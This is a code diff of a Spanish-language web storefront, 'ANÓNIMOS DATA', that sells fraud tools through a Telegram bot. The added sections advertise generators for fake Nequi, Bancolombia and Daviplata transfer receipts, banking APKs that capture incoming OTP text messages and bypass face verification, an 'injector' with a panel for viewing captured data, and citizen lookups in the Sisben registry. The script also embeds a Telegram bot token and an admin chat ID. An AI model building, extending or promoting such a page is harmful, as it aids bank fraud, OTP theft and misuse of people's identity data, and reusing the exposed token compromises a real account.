@@ -9,6 +9,8 @@
 :root {
     --primary: #A855F7;
     --danger: #ef4444;
+    --warning: #f59e0b;
+    --info: #3b82f6;
     --bg: #030305;
     --panel: rgba(10, 10, 20, 0.9);
     --border: #222;
@@ -25,6 +27,7 @@ body {
     overflow-x: hidden;
 }
 
+/* Efecto de líneas de escaneo CRT */
 body::before {
     content: " ";
     display: block;
@@ -80,10 +83,12 @@ body::before {
     padding: 25px;
     position: relative;
     box-shadow: 0 0 15px rgba(168, 85, 247, 0.1);
+    display: flex;
+    flex-direction: column;
 }
 
 .panel::before {
-    content: "NODE_V4.2_CONNECTED";
+    content: "NODE_STABLE_V4";
     position: absolute;
     top: -10px; left: 15px;
     background: var(--bg);
@@ -93,41 +98,44 @@ body::before {
 }
 
 h2 {
-    font-size: 1.2rem;
+    font-size: 1.1rem;
     margin-bottom: 20px;
     border-bottom: 1px solid var(--primary);
-    display: inline-block;
+    padding-bottom: 5px;
     color: #fff;
+    text-transform: uppercase;
 }
 
 .service-item {
-    font-size: 0.85rem;
-    margin-bottom: 5px;
+    font-size: 0.8rem;
+    margin-bottom: 8px;
     color: #ccc;
+    line-height: 1.4;
 }
 
 .highlight { color: var(--primary); font-weight: bold; }
+.price-tag { color: var(--text); font-weight: bold; float: right; }
 
 .btn {
     display: block;
     width: 100%;
-    padding: 15px;
+    padding: 12px;
     background: transparent;
     border: 1px solid var(--primary);
     color: var(--primary);
     text-align: center;
     text-decoration: none;
     font-weight: bold;
-    margin-top: 20px;
+    margin-top: auto;
     transition: 0.3s;
     text-transform: uppercase;
-    cursor: pointer;
+    font-size: 0.8rem;
 }
 
 .btn:hover {
     background: var(--primary);
     color: #000;
-    box-shadow: 0 0 20px var(--primary);
+    box-shadow: 0 0 15px var(--primary);
 }
 
 .terminal-input {
@@ -137,8 +145,9 @@ h2 {
     color: var(--text);
     padding: 10px;
     font-family: 'Space Mono', monospace;
-    margin-top: 10px;
+    margin-bottom: 10px;
     outline: none;
+    font-size: 0.8rem;
 }
 
 .tag-pro {
@@ -147,17 +156,11 @@ h2 {
     font-size: 0.6rem;
     padding: 2px 5px;
     font-weight: bold;
-    margin-left: 5px;
+    border-radius: 2px;
 }
 
-/* ESTILOS DEL CHAT INTEGRADO */
-#chat-tiiza {
-    position: fixed;
-    bottom: 20px;
-    right: 20px;
-    z-index: 9999;
-}
-
+/* CHAT STYLES */
+#chat-tiiza { position: fixed; bottom: 20px; right: 20px; z-index: 9999; }
 #box-tiiza {
     display: none;
     width: 300px;
@@ -165,122 +168,79 @@ h2 {
     border: 1px solid var(--primary);
     flex-direction: column;
     margin-bottom: 15px;
-    box-shadow: 0 0 30px rgba(168, 85, 247, 0.3);
 }
+.chat-header { background: var(--primary); color: #000; padding: 10px; font-weight: bold; display: flex; justify-content: space-between; font-size: 0.8rem; }
+#msjs-tiiza { height: 200px; overflow-y: auto; padding: 15px; font-size: 0.75rem; background: rgba(0,0,0,0.8); }
+.chat-input-area { padding: 10px; display: flex; gap: 5px; border-top: 1px solid #222; }
+.chat-btn-open { background: var(--primary); width: 55px; height: 55px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 24px; float: right; }
 
-.chat-header {
-    background: var(--primary);
-    color: #000;
-    padding: 10px;
-    font-weight: bold;
-    display: flex;
-    justify-content: space-between;
-    font-size: 0.8rem;
-}
-
-#msjs-tiiza {
-    height: 250px;
-    overflow-y: auto;
-    padding: 15px;
-    font-size: 0.75rem;
-    color: var(--text);
-    background: rgba(0,0,0,0.8);
-}
-
-.chat-input-area {
-    padding: 10px;
-    border-top: 1px solid #222;
-    display: flex;
-    gap: 5px;
-}
-
-.chat-btn-open {
-    background: var(--primary);
-    width: 60px;
-    height: 60px;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    cursor: pointer;
-    box-shadow: 0 0 20px var(--primary);
-    font-size: 24px;
-    float: right;
-}
-
-footer {
-    text-align: center;
-    padding: 60px 5%;
-    background: rgba(0,0,0,0.5);
-}
-
-.buy-box {
-    border: 2px solid var(--text);
-    padding: 25px;
-    background: rgba(0, 255, 65, 0.05);
-    margin: 30px 0;
-    text-align: center;
-}
-
-.buy-box h3 { color: var(--text); margin-bottom: 15px; }
-
-.bot-link {
-    font-size: 1.6rem;
-    color: var(--text);
-    text-decoration: none;
-    font-weight: bold;
-    text-shadow: 0 0 10px var(--text);
-}
-
-.footer-line { color: var(--primary); margin-top: 15px; font-weight: bold; letter-spacing: 2px; }
+footer { text-align: center; padding: 40px; border-top: 1px solid var(--border); margin-top: 40px; opacity: 0.7; font-size: 0.8rem; }
 </style>
 </head>
 <body>
 
 <div class="status-bar">
-    <div>NODO: <span style="color:var(--primary)">ANÓNIMOS DATA</span></div>
-    <div class="blink" id="session-tag">● ESPERANDO AUTENTICACIÓN JWT</div>
+    <div>INFRAESTRUCTURA: <span style="color:var(--primary)">TIIZA TECH</span></div>
+    <div class="blink">● SISTEMA OPERATIVO 24/7</div>
     <div>SOPORTE: @AnonimosSupport_bot</div>
 </div>
 
 <header class="terminal-hero">
-    <h1>💀 ANÓNIMOS DATA 💀</h1>
-    <p>ACCESO EXCLUSIVO A INFRAESTRUCTURA FINANCIERA</p>
+    <h1>ANÓNIMOS DATA</h1>
+    <p style="letter-spacing: 5px; color: var(--primary);">SOLUCIONES FINANCIERAS HÍBRIDAS</p>
 </header>
 
 <div class="container">
 
-    <div class="buy-box">
-        <h3>🛒 ADQUIRIR LICENCIAS / KEYS</h3>
-        <p style="font-size: 0.9rem; margin-bottom: 20px; color: #fff;">Transacciones vía Telegram para anonimato total.</p>
-        <a href="https://t.me/AnonimosSupport_bot" class="bot-link">👉 @AnonimosSupport_bot</a>
+    <h2 style="border: none; text-align: center; font-size: 1.5rem; margin-bottom: 30px;">[ SUSCRIPCIONES MENSUALES ]</h2>
+    <div class="grid" style="margin-bottom: 50px;">
+        <div class="panel" style="border-color: var(--text);">
+            <h2>PLAN BÁSICO (NODE)</h2>
+            <div class="service-item">➜ Acceso a Consultas Sisben</div>
+            <div class="service-item">➜ Generador Comprobantes GNV</div>
+            <div class="service-item">➜ Soporte Estándar</div>
+            <div class="price-tag">$50.000 / Mes</div>
+            <a href="https://t.me/AnonimosSupport_bot?start=plan_basico" class="btn">ADQUIRIR</a>
+        </div>
+        <div class="panel" style="border-color: var(--primary); transform: scale(1.05); z-index: 10;">
+            <h2>PLAN VIP (FULL APK) <span class="tag-pro">TOP</span></h2>
+            <div class="service-item">➜ Todo el Plan Básico</div>
+            <div class="service-item">➜ APKs Premium (Intercepción SMS)</div>
+            <div class="service-item">➜ Bypass Biométrico Actualizado</div>
+            <div class="price-tag">$120.000 / Mes</div>
+            <a href="https://t.me/AnonimosSupport_bot?start=plan_vip" class="btn" style="background: var(--primary); color: #000;">ACCESO TOTAL</a>
+        </div>
     </div>
 
     <div class="grid">
-        <div class="panel">
-            <h2>🔎 CONSULTA SISBEN IV <span class="tag-pro">API HÍBRIDA</span></h2>
-            <form id="sisben-form">
-                <select class="terminal-input" id="tipo_doc">
-                    <option value="3">Cédula de Ciudadanía</option>
-                    <option value="2">Tarjeta de Identidad</option>
-                </select>
-                <input type="text" class="terminal-input" placeholder="DOCUMENTO..." id="num_doc">
-                <button type="button" class="btn">EJECUTAR CONSULTA</button>
-            </form>
-        </div>
-
-        <div class="panel" style="border-color: var(--danger);">
-            <h2 style="color: var(--danger); border-color: var(--danger);">🔐 ACTIVACIÓN DE KEY</h2>
-            <input type="text" id="input-key" class="terminal-input" style="border-color: var(--danger);" placeholder="PEGAR KEY...">
-            <button class="btn" style="border-color: var(--danger); color: var(--danger);">VALIDAR</button>
+        <div class="panel" style="border-color: var(--info);">
+            <h2 style="color: var(--info); border-color: var(--info);">📄 BOT COMPROBANTES GNV</h2>
+            <div class="service-item">Sistema automatizado para generar vouchers de transferencias.</div>
+            <div class="service-item">➜ <span class="highlight">Formatos:</span> Nequi, Bancolombia, Daviplata.</div>
+            <div class="service-item">➜ <span class="highlight">Calidad:</span> 4K con edición de fecha/hora.</div>
+            <a href="https://t.me/AnonimosSupport_bot?start=bot_comprobantes" class="btn" style="border-color: var(--info); color: var(--info);">ABRIR BOT GNV</a>
         </div>
 
         <div class="panel">
-            <h2>🏦 ENTIDADES</h2>
-            <div class="service-item">➜ NEQUI PRO v4.2</div>
-            <div class="service-item">➜ BANCOLOMBIA PREMIUM</div>
-            <div class="service-item">➜ DAVIPLATA ELITE</div>
-            <a href="https://t.me/AnonimosSupport_bot" class="btn">CATÁLOGO</a>
+            <h2>📲 NEQUI PRO (AND/iOS)</h2>
+            <div class="service-item">➜ <span class="highlight">Función:</span> Saldo Infinito (Simulado) y Bypass de Rostro.</div>
+            <div class="service-item">➜ <span class="highlight">SMS:</span> Captura de mensajes OTP entrantes.</div>
+            <div class="service-item">➜ <span class="highlight">Compatibilidad:</span> Android 10+ / iOS Jailbreak.</div>
+            <a href="https://t.me/AnonimosSupport_bot?start=info_nequi" class="btn">DESCARGAR APK</a>
+        </div>
+
+        <div class="panel">
+            <h2>📲 BANCO PREMIUM v2</h2>
+            <div class="service-item">➜ <span class="highlight">Función:</span> Inyector de comprobantes internos.</div>
+            <div class="service-item">➜ <span class="highlight">Logs:</span> Panel de administración para ver datos.</div>
+            <div class="service-item">➜ <span class="highlight">Anti-Ban:</span> Encriptación de paquete SSL.</div>
+            <a href="https://t.me/AnonimosSupport_bot?start=info_banco" class="btn">DESCARGAR APK</a>
+        </div>
+
+        <div class="panel">
+            <h2>🔎 CONSULTA SISBEN IV</h2>
+            <input type="text" class="terminal-input" placeholder="INGRESE DOCUMENTO...">
+            <button class="btn">EJECUTAR API</button>
         </div>
     </div>
 </div>
@@ -288,12 +248,11 @@ footer {
 <div id="chat-tiiza">
     <div id="box-tiiza">
         <div class="chat-header">
-            <span>📡 SOPORTE EN VIVO</span>
+            <span>📡 NODO CENTRAL @Tiizatech</span>
             <span onclick="toggleChat()" style="cursor: pointer;">[ _ ]</span>
         </div>
         <div id="msjs-tiiza">
-            <div>> Conexión establecida con el Nodo @Tiizatech.</div>
-            <div>> ¿En qué podemos ayudarte hoy?</div>
+            <div>> Nodo activo. Esperando consulta...</div>
         </div>
         <div class="chat-input-area">
             <input type="text" id="input-msg" placeholder="Escribir..." style="flex:1; background:#000; border:1px solid var(--primary); color:var(--text); padding:5px; outline:none;">
@@ -304,13 +263,13 @@ footer {
 </div>
 
 <footer>
-    <div class="footer-line">SISTEMA CARGADO... ONLY FOR THE STRONG</div>
-    <p>© 2026 DEEP WEB CLOUD | @Tiizatech</p>
+    <p>© 2026 ANÓNIMOS DATA INFRASTRUCTURE</p>
+    <p style="color: var(--primary);">POWERED BY @Tiizatech | @Broquicalifoxx</p>
 </footer>
 
 <script>
 const BOT_TOKEN = "8759042236:AAGri_H-rimJAjr5R7m8yK3oiJkhOxSbpGE";
-const ADMIN_ID = "PON_AQUI_TU_ID_PERSONAL"; // Cambia esto por tu ID de Telegram real
+const ADMIN_ID = "8114050673"; 
 
 function toggleChat() {
     const box = document.getElementById('box-tiiza');
@@ -328,7 +287,7 @@ async function enviarMensaje() {
     chatBox.scrollTop = chatBox.scrollHeight;
 
     const webId = "USER_" + Math.floor(Math.random() * 9999);
-    const textoTelegram = `🌐 **NUEVO MENSAJE WEB**\nID: \`${webId}\`\nMsg: ${msg}\n\nResponder con: \`${webId} [mensaje]\``;
+    const textoTelegram = `🌐 **MENSAJE WEB**\nID: \`${webId}\`\nMsg: ${msg}\n\nResponder: \`${webId} [mensaje]\``;
 
     try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -336,10 +295,7 @@ async function enviarMensaje() {
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ chat_id: ADMIN_ID, text: textoTelegram, parse_mode: 'Markdown' })
         });
-        chatBox.innerHTML += `<div style="color:var(--primary); font-size:0.6rem;">> Enviado al Nodo Central.</div>`;
-    } catch (e) {
-        chatBox.innerHTML += `<div style="color:red;">> Error de red.</div>`;
-    }
+    } catch (e) { console.error("Error al enviar"); }
 }
 </script>
 
